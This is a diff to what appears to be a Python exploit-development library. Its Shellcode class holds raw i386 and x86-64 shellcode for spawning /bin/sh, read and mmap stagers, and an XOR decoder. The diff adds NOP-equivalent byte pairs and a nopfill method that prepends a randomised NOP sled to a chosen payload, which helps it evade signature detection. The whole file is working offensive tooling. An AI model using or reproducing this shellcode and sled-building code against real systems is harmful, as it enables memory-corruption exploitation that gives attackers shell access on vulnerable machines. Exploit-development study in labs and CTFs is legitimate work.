@@ -8,6 +8,7 @@ import socket
 import time
 import fcntl
 import errno
+import random
 from telnetlib import Telnet
 from subprocess import Popen, PIPE
 
@@ -480,6 +481,7 @@ class ROP(ELF):
 class Shellcode:
     _database = {
         'i386': {
+            '_noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
             'exec_shell': "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80",
             'read_stager': "\xeb\x10\x59\x31\xdb\x8d\x53\x01\xc1\xe2\x0c\x8d\x43\x03\xcd\x80\xeb\x05\xe8\xeb\xff\xff\xff",
             'mmap_stager': "\x31\xc9\x8d\x51\x01\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\x8d\x41\x5a\xcd\x80\x89\xcb\x89\xc1\x8d\x43\x03\xcd\x80\xff\xe1",
@@ -490,6 +492,7 @@ class Shellcode:
             '_xor_decoder': "\xeb\x09\x59\x80\x31${key}\x74\x08\x41\xeb\xf8\xe8\xf2\xff\xff\xff",
         },
         'x86-64': {
+            '_noppairs': ['PX', 'QY', 'RZ'],
             'exec_shell': "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05",
             'read_stager': "\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xeb\x05\xe8\xe8\xff\xff\xff",
             'mmap_stager': "\x4d\x31\xc9\x4d\x8d\x41\xff\x4d\x8d\x51\x22\x49\x8d\x51\x07\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x4c\x89\xcf\x49\x8d\x41\x09\x0f\x05\x48\x89\xf2\x48\x89\xc6\x4c\x89\xc8\x0f\x05\xff\xe6",
@@ -510,6 +513,14 @@ class Shellcode:
         if name not in self._database[self.arch]:
             raise Exception("unsupported shellcode for this architechture: %r" % name)
         return self._database[self.arch][name]
+
+    def nopfill(self, name, size, buf=''):
+        code = self.get(name)
+        noplen = size - len(buf) - len(code)
+        buf = bytearray()
+        while len(buf) < noplen:
+            buf += random.choice(self.get('_noppairs'))
+        return str(buf[:noplen] + code)
 
     def cat(self, fpath):
         return self.get('_cat') + chr(len(fpath)) + fpath
